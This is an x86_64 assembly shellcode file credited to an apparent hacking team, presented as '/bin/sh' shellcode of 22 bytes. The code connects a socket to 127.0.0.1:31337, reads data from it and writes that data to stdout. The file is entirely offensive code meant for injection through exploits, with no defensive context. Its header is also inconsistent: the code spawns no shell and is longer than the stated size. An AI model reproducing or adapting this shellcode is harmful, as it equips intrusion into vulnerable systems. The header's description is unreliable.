BITS 64
; Author Rinzler - l33t1m Team
; /bin/sh Linux x86_64 Shellcode
; Shellcode size 22 bytes
global _start

_start:
	; syscall socket
	push 0x29
	pop rax
	cdq
	push 0x2
	pop rdi
	push 0x1
	pop rsi
	syscall

	; syscall connect
	push rax
	pop rdi
	push 0x2a
	pop rax
	push 0x10
	pop rdx
	mov rsi, 0x0100007f697a0002	; 127.0.0.1:31337
	push rsi
	push rsp
	pop rsi
	syscall

	; syscall read
	sub sp, 0xfff
	push rsp
	pop rsi
	cdq
	mov dx, 0xfff	; size to read
	syscall

	; syscall write
	push 1
	pop rdi	; set stdout fd = 1
	push rax
	pop rdx
	push 1
	pop rax
	syscall